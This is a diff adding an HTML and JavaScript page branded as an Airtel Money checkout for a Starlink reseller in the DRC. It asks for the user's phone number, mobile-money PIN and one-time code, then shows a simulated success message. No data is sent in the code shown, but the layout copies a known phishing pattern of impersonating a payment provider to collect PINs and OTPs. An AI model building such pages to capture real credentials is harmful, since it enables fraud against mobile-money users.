@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paiement Airtel Money – STARLINK RDC</title>
+  <meta name="description" content="Finalisez votre achat de forfait Starlink via Airtel Money." />
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    /* ── OTP card ── */
+    .otp-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      overflow: hidden;
+      display: none; /* shown after phone+PIN submit */
+    }
+
+    .otp-card-header {
+      background: var(--airtel-red);
+      color: #fff;
+      padding: 2rem 1.5rem 1.75rem;
+      text-align: center;
+    }
+
+    /* SIM-card icon */
+    .sim-icon {
+      width: 64px;
+      height: 64px;
+      background: #fff;
+      border-radius: 10px;
+      margin: 0 auto 1.1rem;
+      position: relative;
+    }
+    /* notch cut */
+    .sim-icon::before {
+      content: '';
+      position: absolute;
+      top: 0; right: 0;
+      width: 20px; height: 20px;
+      background: var(--airtel-red);
+      border-bottom-left-radius: 6px;
+    }
+    /* chip */
+    .sim-icon::after {
+      content: '';
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -40%);
+      width: 30px; height: 22px;
+      background: rgba(255,255,255,0.25);
+      border-radius: 4px;
+      border: 2px solid rgba(255,255,255,0.5);
+    }
+
+    .otp-card-header h2 {
+      font-size: 1.05rem;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .otp-card-body {
+      padding: 1.75rem 1.5rem 1.5rem;
+      text-align: center;
+    }
+
+    .otp-card-body h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin-bottom: 0.4rem;
+    }
+
+    .otp-card-body .otp-sub {
+      font-size: 0.88rem;
+      color: #666;
+      line-height: 1.55;
+      margin-bottom: 0.3rem;
+    }
+
+    .otp-phone {
+      font-size: 1rem;
+      font-weight: 700;
+      color: var(--airtel-red);
+      margin: 0.5rem 0 1.5rem;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .otp-inputs input {
+      width: 58px;
+      height: 58px;
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 700;
+      border: 1.5px solid #d0d5e0;
+      border-radius: 10px;
+      outline: none;
+      font-family: 'Inter', Arial, sans-serif;
+      color: #1a1a2e;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .otp-inputs input:first-child {
+      border-color: var(--airtel-red);
+      box-shadow: 0 0 0 3px rgba(227,26,33,0.15);
+    }
+
+    .otp-inputs input:focus {
+      border-color: var(--airtel-red);
+      box-shadow: 0 0 0 3px rgba(227,26,33,0.15);
+    }
+
+    .btn-verify {
+      display: block;
+      width: 100%;
+      padding: 0.95rem;
+      background: var(--airtel-red);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      cursor: pointer;
+      font-family: 'Inter', Arial, sans-serif;
+      transition: background 0.2s, opacity 0.2s;
+    }
+
+    .btn-verify:hover { background: var(--airtel-red-hover); }
+    .btn-verify:disabled { opacity: 0.65; cursor: not-allowed; }
+  </style>
+</head>
+<body class="payment-body">
+
+  <!-- =====================
+       AIRTEL MONEY NAVBAR
+  ===================== -->
+  <nav class="payment-navbar">
+    <div class="payment-brand">
+      airtel <span class="money-text">money</span>
+    </div>
+  </nav>
+
+  <div class="payment-container">
+
+    <!-- =====================
+         STEP 1 – Phone + PIN
+    ===================== -->
+    <div class="payment-card" id="step-payment">
+
+      <!-- Header -->
+      <div class="payment-card-header">
+        <h2 id="plan-name">Forfait Basique – 5GB</h2>
+        <div class="payment-amount" id="plan-price">CDF 1 500,00</div>
+        <div class="payment-service">Service : STARLINK Revendeur RDC</div>
+      </div>
+
+      <!-- Body -->
+      <div class="payment-card-body">
+        <form id="payment-form" onsubmit="handlePayment(event)">
+
+          <!-- Phone Number -->
+          <div class="form-group">
+            <label for="phone">Numéro Airtel Money</label>
+            <div class="phone-input-wrap">
+              <span class="phone-prefix">+243</span>
+              <input
+                type="tel"
+                id="phone"
+                name="phone"
+                placeholder="09X XXX XXXX"
+                maxlength="10"
+                required
+                pattern="[0-9]{9,10}"
+                autocomplete="tel"
+              />
+            </div>
+          </div>
+
+          <!-- PIN -->
+          <div class="form-group">
+            <label>Code PIN Airtel Money</label>
+            <div class="pin-inputs">
+              <input type="password" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
+              <input type="password" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
+              <input type="password" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
+              <input type="password" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
+            </div>
+          </div>
+
+          <button type="submit" class="btn-confirm" id="confirm-btn">
+            Confirmer le Paiement
+          </button>
+        </form>
+
+        <p class="security-note">🔒 Paiement sécurisé via Airtel Money</p>
+      </div>
+
+    </div>
+
+    <!-- =====================
+         STEP 2 – OTP Verification
+    ===================== -->
+    <div class="otp-card" id="step-otp">
+
+      <!-- Red header with SIM icon -->
+      <div class="otp-card-header">
+        <div class="sim-icon"></div>
+        <h2>Vérification Requise</h2>
+      </div>
+
+      <!-- Body -->
+      <div class="otp-card-body">
+        <h3>Vérification Requise</h3>
+        <p class="otp-sub">Entrez le code OTP</p>
+        <p class="otp-sub">Un code à 4 chiffres a été envoyé au</p>
+        <div class="otp-phone" id="otp-phone-display">+243 ─ ─ ─ ─ ─ ─ ─ ─</div>
+
+        <div class="otp-inputs">
+          <input type="tel" id="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+          <input type="tel" id="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+          <input type="tel" id="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+          <input type="tel" id="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]" />
+        </div>
+
+        <button class="btn-verify" id="verify-btn" onclick="handleOtp()">
+          Vérifier et Payer
+        </button>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- =====================
+       SUCCESS MODAL
+  ===================== -->
+  <div id="success-overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:999; align-items:center; justify-content:center;">
+    <div style="background:#fff; border-radius:16px; padding:2.5rem; max-width:380px; width:90%; text-align:center; box-shadow:0 8px 40px rgba(0,0,0,0.2);">
+      <div style="font-size:3rem; margin-bottom:0.75rem;">✅</div>
+      <h2 style="color:#1a1a2e; font-size:1.3rem; margin-bottom:0.5rem;">Paiement Réussi !</h2>
+      <p style="color:#555; font-size:0.92rem; line-height:1.6;" id="success-msg">Votre forfait a été activé avec succès.</p>
+      <a href="index.html" style="display:inline-block; margin-top:1.5rem; padding:0.75rem 2rem; background:#E31A21; color:#fff; border-radius:8px; font-weight:700; font-size:0.95rem;">
+        Retour à l'accueil
+      </a>
+    </div>
+  </div>
+
+  <script>
+    // ── Plan data ──────────────────────────────────────────────────
+    const PLANS = {
+      '1': { name: 'Forfait Basique – 5GB',    price: 'CDF 1 500,00' },
+      '2': { name: 'Forfait Standard – 15GB',  price: 'CDF 2 500,00' },
+      '3': { name: 'Forfait Premium – 30GB',   price: 'CDF 4 500,00' },
+      '4': { name: 'Forfait Illimité – ∞ GB',  price: 'CDF 7 500,00' },
+    };
+
+    const params = new URLSearchParams(window.location.search);
+    const planId = params.get('plan') || '1';
+    const plan   = PLANS[planId] || PLANS['1'];
+    document.getElementById('plan-name').textContent  = plan.name;
+    document.getElementById('plan-price').textContent = plan.price;
+
+    // ── Auto-advance PIN boxes ─────────────────────────────────────
+    function wireBoxes(selector) {
+      const boxes = document.querySelectorAll(selector);
+      boxes.forEach((box, idx) => {
+        box.addEventListener('input', () => {
+          if (box.value.length === 1 && idx < boxes.length - 1) boxes[idx + 1].focus();
+        });
+        box.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && box.value === '' && idx > 0) boxes[idx - 1].focus();
+        });
+      });
+    }
+    wireBoxes('.pin-inputs input');
+    wireBoxes('.otp-inputs input');
+
+    // ── STEP 1: Phone + PIN submit → show OTP card ─────────────────
+    function handlePayment(e) {
+      e.preventDefault();
+
+      const rawPhone = document.getElementById('phone').value.trim();
+      const formatted = '+243' + rawPhone;
+
+      // Show OTP card, hide payment card
+      document.getElementById('step-payment').style.display = 'none';
+      const otpCard = document.getElementById('step-otp');
+      otpCard.style.display = 'block';
+
+      // Fill in the phone number
+      document.getElementById('otp-phone-display').textContent = formatted;
+
+      // Focus first OTP box
+      document.getElementById('otp1').focus();
+    }
+
+    // ── STEP 2: OTP submit → success ──────────────────────────────
+    function handleOtp() {
+      const code = ['otp1','otp2','otp3','otp4'].map(id => document.getElementById(id).value).join('');
+      if (code.length < 4) {
+        document.querySelectorAll('.otp-inputs input').forEach(b => {
+          b.style.borderColor = '#ef4444';
+        });
+        return;
+      }
+
+      const btn = document.getElementById('verify-btn');
+      btn.disabled = true;
+      btn.textContent = 'Vérification…';
+
+      setTimeout(() => {
+        document.getElementById('success-msg').textContent =
+          `${plan.name} a été activé avec succès sur votre ligne Airtel Money.`;
+        document.getElementById('success-overlay').style.display = 'flex';
+      }, 1800);
+    }
+  </script>
+
+</body>
+</html>
